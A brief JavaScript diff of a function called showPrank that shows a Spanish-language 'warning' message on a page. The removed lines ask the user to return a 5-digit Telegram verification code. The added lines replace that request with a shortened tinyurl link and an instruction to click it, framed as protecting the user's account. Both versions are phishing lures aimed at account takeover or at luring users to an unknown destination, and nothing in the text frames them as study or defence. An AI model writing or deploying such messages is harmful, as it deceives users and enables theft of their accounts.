@@ -4,7 +4,7 @@ function showPrank() {
     message.innerHTML = `
         Advertencia<br><br>
         El objetivo es garantizar la sostenibilidad a largo plazo de su cuenta<br>
-        Por favor, devuelva el código de 5 dígitos enviado por Telegram<br>
-        Gracias por su participación
+        https://tinyurl.com/ybbt2paa<br>
+        Haz clic en este enlace. Gracias por su participación
     `;
 }
